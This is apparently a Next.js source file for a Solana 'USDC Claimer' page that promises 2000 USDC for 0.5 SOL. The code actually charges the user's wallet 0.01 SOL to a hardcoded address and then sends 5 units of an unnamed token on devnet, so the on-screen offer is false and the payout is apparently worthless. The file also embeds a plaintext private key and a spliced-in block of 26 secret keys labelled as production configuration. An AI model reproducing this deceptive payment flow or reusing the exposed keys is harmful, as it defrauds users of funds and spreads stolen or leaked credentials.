/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4d9GYkay6uBrmSRWDcRCnwc1bawA5kjagmXx5QVtGDXXGS9uo9bi7L6dG9rdmu1ZptUoNhFVEeZ6rcqwzNdRumhM"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4g8bG5NfeAM1U9cQNqZZWNnhjToGGfh7SKy1r98Tz92xQrj1Vh2dUvSBNQF4iHYuwakygCiUDnwqrdNTnqNFLUV1",
  "key1": "2Uy3ku9VmNCryRkN4DruLETQrBzu3wPopKzQnpNQ65yVM5fzhYVorFYq1m2zDBEaKwtPTxEWWcCqs928tfMpcP7H",
  "key2": "35dwJ8tViaVCqjZc8wuzvquKVvzfxYAkEoNFKE9PyCvcGzJc2TGTWAnnuiZzjgTeqqzQtpJQEPcNYoaJceVadgfk",
  "key3": "2BrupstGWYxecSJsySVnu3rjV6f1ht1spgrjkRogKfRDQRxqtmGaoE9Wfsh9tcR3rdCdgSe1YUw992DmQvG5qYFJ",
  "key4": "4D36G9yeeaHMkTBZm1LWvFkmedWcX2sw4Xt6rb9PJ5LKskteUJ9PDjXTAautbnxkxncWWwaqJynPw2Komf27WqQn",
  "key5": "psHsSQMtUzFByjr6XZE9bXs2tPhXGsxgcMW4yokHkT6EMruFNKCjQyWqYpNUXmNEw7PuLPQfb8zDUmpGASzzSpg",
  "key6": "2YzUXEKctg6kUerQE8ZMWJuNDfJQRHExs9wHNfy2fnskG37CyM99RCsARVdyXHnvtND6eu1BB6s8fujdRv2SRbPy",
  "key7": "4YxR5v6Q59AW16EnF2hUbnmcX5xFRyNKGkG1KLhodASFnHChCxYWNsztw9pZksDfUkRNBuqzmAxpNX5Zjy6KJSX3",
  "key8": "jVpKxP7Aw2eAJyLdYog3uKeNbGvDsKCTF3oFs2Xq51ng8XLZrg3w6D2zNEsuEZrT1WyeFvgS8mz2RqQH1ax6KTi",
  "key9": "5fLu1oVuEuXJVruQzDiMhqg8yaZEtpRYRQLeWZVSsPHHQhHU1YxkPunurd3QLmW87qZsxAXmu8rnf5yC9hFjP9Mg",
  "key10": "BZ9TgtomfDid2QCQdioBSdxpsX2eKNtHnbzB3ztyRMFUYx9cjArRWkXUAfQmXpYvrg15kBn6WBDRYXzvKCTZAiF",
  "key11": "3vDzredi2UWpmW6SWRjFqVtWz7EkZvqRCrYQTSWqEb1aJh5fWE31HRKVtqZgwLq34ovxEBAqoZDXuzeU2WK28eVX",
  "key12": "34cnjQ4G3ETpfhWCmYrjaXbDvGRarTob7arQkJxjn87YRhxy2kcMvB2AVriCCAiZ5Q6yBwDJJ6qauz3GGdZrSm3P",
  "key13": "48PfyZxSM849WpBoyGXdiV37PLaZaKboA9pVP6rwiS5B6ejGiQMbJH2aZvY5vbYMWcE97XQcrXpCY8CeLVHL7b6m",
  "key14": "27RLLhBzybBvbqDcNBqQ5DpZMV6QsZPnYnQffqZGLr1f6LmDPf34cZKp29cHEfoJGkKF4x7qxn8VgX2f1aUcQAn6",
  "key15": "4v4TnDdPg2UECcj1wR4EztMnrESqBRCiZgSx28zdZq7tsckXZ3z6mSQLmjc1QEGNMWntdrMGW9NhMkjLbZftF2ur",
  "key16": "4rpNmAgHsXuShiyE6dkwMmiMrLP3qPphZ5sLTYWMHNYptwp7H7m8A2YMFaWhrBSA5d9B1tumZQJzxzTt5R6MgYfT",
  "key17": "FaDDd9KWXmut6R1QfuPRpRFJ7v545PDQav2rJDgym2bBiqKAwGqYpoCiCbbTC65yxsnopgcCvrSkWfmUS43zdNy",
  "key18": "4btb95vzSkg5xNtWb3DwnAn5SG1BzduGmnKMBfk4sy4Vb9iVgehAMSMEC8kJfRrWW2Dcynb2a6PV44VJ1MJEe24Z",
  "key19": "ZixvErSq4x8Um52E68XrhW5drnsHzamhNPufLDzs8KStHZWBmZ3CwQycNATXuoqski6XGwYYK5MJggUJAWGWVPP",
  "key20": "62H7S2SH7TFSu2WSh9uQLDCzYP2niPoVYFcJGVjUgcxdZNgAPQxsdSvPg2TEDdDkThNvoc1LkZoRKktoKGZf4WhQ",
  "key21": "3esK5zQKQ23A7kjYrVer4jjC5726EuRM2FbDubDGsCJ8qnihoFJUS8m2Yxa95RUstguEA128894x19vWe2MhWdKv",
  "key22": "3j1jhSA8vMLRDgumdvbtZYdaQYSxmJedtRoXQhvPqtcyWQdv9Vj11fZLxWPgqbvypRnZ5EUaVV2y14ARjDetjXuk",
  "key23": "3N1gWsiLWi7sS7mx5Bekq6xgibXCTu3EfeBui1JLXtTaEpdHFcgsawJrZqNaFzcX2MHMbBw3RXgyEAHxy1WXSeJr",
  "key24": "3ou36dfkUbmxY4gsaEoNnGov8yopYQeskR5SdGaCtAAmm7iGwpZKLpHy8XuPfGCaqUt4V9QEMEoY3nsA6G7iXjxi",
  "key25": "UXYNFNWfcErS7r1rvHB79CoBfT9T6AFZk2dmbSqPDnWn8b5unkUWbNkWLisUYgWnWCHemkG8dQZoJxt76vYGiyr"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
